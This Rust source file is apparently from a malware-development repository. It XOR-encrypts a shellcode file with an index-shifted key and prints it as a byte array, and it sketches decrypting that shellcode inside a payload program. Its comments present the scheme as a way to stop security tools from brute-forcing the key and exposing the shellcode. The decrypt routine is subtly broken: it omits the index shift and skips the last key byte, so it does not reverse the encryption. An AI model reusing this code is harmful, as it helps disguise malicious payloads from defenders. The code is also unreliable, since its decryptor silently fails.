/*
For codes. Visit: https://github.com/Whitecat18/Rust-for-Malware-Development.git
@5mukx
*/

use std::fs::File;
use std::io::Read;


/* 
Default XOR Method
*/

// fn xor(data: &[u8], key: &str) -> Vec<u8>{
//     let key_bytes = key.as_bytes();
//     let mut output = Vec::with_capacity(data.len());

//     for (i, &byte) in data.iter().enumerate(){
//         let current_key = key_bytes[i % key_bytes.len()];
//         output.push(byte ^ (current_key));
//     }
//     output
// }


/* /
----->
There are some tools and security solutions can brute force the key which will expose the decrypted shellcode we can make i 
to be an part of the key. with keyspace much larger now, it's more difficult to brute force the key.
----->

/ */

fn xor(data: &[u8], key: &str) -> Vec<u8>{
    let key_bytes = key.as_bytes();
    let mut output = Vec::with_capacity(data.len());

    for (i, &byte) in data.iter().enumerate(){
        let current_key = key_bytes[i % key_bytes.len()];
        output.push(byte ^ current_key.wrapping_add(i as u8));
    }
    output
}

fn xor_encrypt(data: &[u8], key: &str)-> String{
    let ciphertext = xor(data, key);
    let hex_str: Vec<String> = ciphertext.iter().map(|&x| format!("{:02x}",x)).collect();
    format!("{{ 0x{} }};", hex_str.join(", 0x"))
}

// XOR DECRYPT FUNCTION 
fn xor_decrypt(data:&mut [u8], key: &[u8]){
    let mut j = 0;
    for i in 0..data.len(){
        if j == key.len() -1{
            j = 0;
        }
        data[i] ^= key[j];
        j += 1;
    }
}


fn main(){

    let mut plaintext = Vec::new();
    
    //keys 
    let secrect_key = "iamafuckingnerd";


    if let Ok(mut file) = File::open("./shellcode.bin"){
        if let Ok(_) = file.read_to_end(&mut plaintext){
            let ciphertext = xor_encrypt(&plaintext, secrect_key);
            println!("{}",ciphertext);
        } else {
        eprintln!("Failed to Read File !");
        } 
    } else {
        eprintln!("Failed to open File !");  
    }


    // Just an normat Implementation of shellcode on your Payload program !
    // set your payload and pass the keys and shellcode
    //----->

    // Shellcode decrypt methods ..!
    let mut shellcode = [];
    let secrect_key = "iamafuckingnerd";
    xor_decrypt(&mut shellcode, secrect_key.as_bytes());

    // After that your logic what to do with the shellcode !...
    
    //----->
}
